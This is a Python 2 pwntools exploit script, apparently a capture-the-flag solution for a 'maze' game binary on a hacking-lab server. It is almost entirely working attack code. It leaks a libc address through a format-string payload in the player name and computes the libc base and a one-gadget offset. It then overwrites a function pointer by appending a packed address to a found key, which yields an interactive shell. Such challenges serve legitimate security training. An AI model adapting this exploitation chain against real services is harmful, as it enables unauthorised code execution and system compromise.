#!/usr/bin/env python2

from pwn import *
import re

remote_exploit = len(sys.argv) > 1 and sys.argv[1] == 'remote'

p = remote('whale.hacking-lab.com', 7331) if remote_exploit else process('./maze')

directions = [ 'north', 'east', 'south', 'west' ]

def right_of(current_dir):
    return directions[(directions.index(current_dir) + 1) % len(directions)]

def left_of(current_dir):
    return directions[(directions.index(current_dir) + len(directions) - 1) % len(directions)]

def find_libc_start_main_addr(instr_offset):
    # change name to string format pattern
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('%19$p')
    p.recvuntil('> ')

    # start the game
    p.sendline('3')
    p.recvuntil('> ')

    # run whoami command to read the libc address
    p.sendline('whoami')
    response = p.recvuntil('> ')
    libc_start_main_addr_with_instr_offset = re.search('(0x[0-9a-f]+)', response).group(1)

    # exit current game
    p.sendline('exit')
    p.recvuntil('> ')

    return int(libc_start_main_addr_with_instr_offset, 16) - instr_offset

def create_poisonous_key(found_key, target_addr):
    return found_key + p64(target_addr)

# read init
p.recvuntil('> ')

# set player name
p.sendline('pjslf')
p.recvuntil('> ')

if remote_exploit:
    # remote libc-2.23.so
    libc_start_main_instr_offset = 240
    libc_start_main_offset = 0x20740
    libc_rce_gadget_offset = 0x4526a
else:
    # local libc-2.28.so
    libc_start_main_instr_offset = 235
    libc_start_main_offset = 0x23fb0
    libc_rce_gadget_offset = 0x448a3

# find libc address
libc_start_main_addr = find_libc_start_main_addr(libc_start_main_instr_offset)
libc_base_addr = libc_start_main_addr - libc_start_main_offset
print 'libc_start_main_offset: ', hex(libc_start_main_offset)
print 'libc_start_main_addr:   ', hex(libc_start_main_addr)
print 'libc_base_addr:         ', hex(libc_base_addr)

# find rce gadget address
libc_rce_gadget_addr = libc_base_addr + libc_rce_gadget_offset
print 'libc_rce_gadget_offset: ', hex(libc_rce_gadget_offset)
print 'libc_rce_gadget_addr:   ', hex(libc_rce_gadget_addr)

# start the game
p.sendline('3')
print p.recvuntil('> ')

key = None
current_direction = 'north'

# play the game
while True:
    p.sendline('go ' + current_direction)
    maze = p.recvuntil('> ')
    facing_wall = 'There is a wall!' in maze

    p.sendline('search')
    maze = p.recvuntil('> ')

    if 'You found a key!' in maze and key is None:
        p.sendline('pick up')
        maze = p.recvuntil('> ')
        key = re.search('You pick up the key: ([0-9a-f]+)', maze).group(1)

    if 'You found a locked chest!' in maze:
        if key is not None:
            p.sendline('open')
            print p.recvuntil('> ')

            # enter the poisonous key to change offset to the "error" function
            poisonous_key = create_poisonous_key(key, libc_rce_gadget_addr)
            p.sendline(poisonous_key)
            p.recvuntil('Press enter to return to the menue')

            # return to the main menu
            p.sendline()
            p.recvuntil('> ')

            # spawn shell
            p.sendline('0')
            p.interactive()
            exit()

    print maze

    if facing_wall:
        current_direction = left_of(current_direction)
    else:
        current_direction = right_of(current_direction)
